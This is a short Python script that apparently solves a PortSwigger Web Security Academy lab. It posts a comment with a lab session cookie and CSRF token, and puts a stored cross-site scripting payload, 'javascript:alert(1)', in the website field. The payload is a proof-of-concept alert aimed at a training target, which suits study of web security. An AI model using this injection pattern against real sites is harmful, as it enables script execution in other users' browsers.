import requests

#remember change input before run script
url = "https://0a2b005e04ba06b6c5b072a000530075.web-security-academy.net/post/comment"
headers = {"Cookie" : "session=2z28G40ZcEpWMxWjrLfbc2gzdd3g9F2U"}
data = {'csrf' : 'z6nuTy6p1CpG23M3FkspdsRODtKbSi79', 'postId' : '10', 'comment' : 'a', 'name' : 'st0rm', 'email' : 'sssss%@gmail.com', 'website' : 'javascript:alert(1)'}
solution = requests.post(url, data=data, headers=headers)

print(solution.content)